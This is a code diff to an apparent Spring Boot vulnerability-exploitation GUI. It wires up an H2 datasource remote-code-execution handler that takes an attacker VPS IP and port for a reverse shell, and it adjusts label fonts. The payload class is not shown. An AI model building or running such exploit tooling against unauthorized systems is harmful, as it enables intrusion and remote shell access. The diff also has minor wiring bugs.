@@ -10,6 +10,7 @@ import javafx.geometry.Pos;
 import javafx.scene.Scene;
 import javafx.scene.control.*;
 import javafx.scene.layout.*;
+import javafx.scene.text.Font;
 import javafx.scene.text.Text;
 import javafx.scene.text.TextFlow;
 import javafx.stage.Stage;
@@ -67,16 +68,22 @@ public class springboot_vul extends Application {
                 // 地址标签
                 Label addlabel = new Label("地址: ");
                 addlabel.setMaxSize(50, 30);
+                addlabel.setFont(new Font("宋体", 13));
                 Label explabel = new Label("漏洞列表: ");
                 explabel.setMaxSize(60, 30);
+                explabel.setFont(new Font("宋体", 13));
                 Label argslabel = new Label("脱敏参数: ");
                 argslabel.setMaxSize(60, 30);
+                argslabel.setFont(new Font("宋体", 13));
                 Label cmdlabel = new Label("命令参数: ");
                 cmdlabel.setMaxSize(60, 30);
+                cmdlabel.setFont(new Font("宋体", 13));
                 Label clslabel = new Label("调用类名: ");
                 clslabel.setMaxSize(60,30);
+                clslabel.setFont(new Font("宋体", 13));
                 Label curstatuslabel = new Label("当前状态： ");
                 curstatuslabel.setMaxSize(70,30);
+                curstatuslabel.setFont(new Font("宋体", 13));
 
                 // 类方法调用下拉框
                 ComboBox<String> clsComboBox = new ComboBox<>();
@@ -97,10 +104,12 @@ public class springboot_vul extends Application {
                 //设置VPS内容
                 Label vpsaddrlabel = new Label("IP：");
                 vpsaddrlabel.setMaxSize(60, 30);
+                vpsaddrlabel.setFont(new Font("宋体", 13));
                 TextField VpsAddrtf = new TextField();
                 VpsAddrtf.setPrefWidth(140);
                 Label vpsportlabel = new Label("port：");
                 vpsportlabel.setMaxSize(60,30);
+                vpsaddrlabel.setFont(new Font("宋体", 13));
                 TextField VpsPorttf = new TextField();
                 VpsPorttf.setPrefWidth(60);
 
@@ -213,6 +222,7 @@ public class springboot_vul extends Application {
                 // 创建容器，将“当前状态”标签和进度条放在里面
                 HBox statusContainer = new HBox();
                 Label statusLabel = new Label("禁止用于未授权测试！");
+                statusLabel.setFont(new Font("宋体", 13));
                 statusLabel.setStyle("-fx-font-size: 12px; -fx-text-fill: red;");
                 progressBar = new ProgressBar(0);  // 初始化进度条，默认值为0
                 progressBar.setPrefWidth(200);     // 设置进度条的宽度
@@ -512,8 +522,41 @@ public class springboot_vul extends Application {
         public void handlerMainSourceGroovyRCE(String address,String command){
 
         }
-        public void handlerH2DatabaseDatasourceRCE(String address,String command){
+        public void handlerH2DatabaseDatasourceRCE(String address,String vpsIP,String vpsPORT){
+                // 清空控制台输出
+                consoleOutput.getChildren().clear();
+                // 暂无证书模块，待设置
+                if (address.isEmpty()){
+                        showAlertEmpty("地址为空！");
+                }else {
+                        if (address.endsWith("/")) {
+                                address = address.replaceAll("/$", "");
+                        }
+                        if (!address.startsWith("http://") && !address.startsWith("https://")) {
+                                address = "http://" + address;
+                        }
+                        if (vpsIP.isEmpty() && vpsPORT.isEmpty()) {
+                                showAlertEmpty("反弹vps的IP和端口为空！");
+                        } else {
+                                H2DataSourceRCE hd = new H2DataSourceRCE(address,vpsIP,vpsPORT);
+                                hd.Exp(new ResultCallback() {
+                                        @Override
+                                        public void onResult(String result) {
+                                                Platform.runLater(() -> {
+                                                        // 输出其他内容到控制台
+                                                        Text text = new Text(result + "\n");
+                                                        consoleOutput.getChildren().add(text);
+                                                        // 自动滚动到最新内容
+                                                        scrollPane.setVvalue(1.0);
+                                                });
+                                        }
 
+                                        @Override
+                                        public void onComplete() {
+                                        }
+                                });
+                        }
+                }
         }
         public void handlerDruidBruteForce(String address){
                 consoleOutput.getChildren().clear();
@@ -610,7 +653,7 @@ public class springboot_vul extends Application {
                                         handlerMainSourceGroovyRCE(address, command);
                                         break;
                                 case 17:
-                                        handlerH2DatabaseDatasourceRCE(address, command);
+                                        handlerH2DatabaseDatasourceRCE(address, vpsIP, vpsPort);
                                         break;
                                 case 18:
                                         handlerDruidBruteForce(address);
@@ -691,7 +734,8 @@ public class springboot_vul extends Application {
                                         handlerMainSourceGroovyRCE(address, command);
                                         break;
                                 case 17:
-                                        handlerH2DatabaseDatasourceRCE(address, command);
+                                        showAlertEmpty("暂时没有写这里，直接getshell");
+//                                        handlerH2DatabaseDatasourceRCE(address, vpsIP, vpsPort);
                                         break;
                                 case 18:
                                         handlerDruidBruteForce(address);
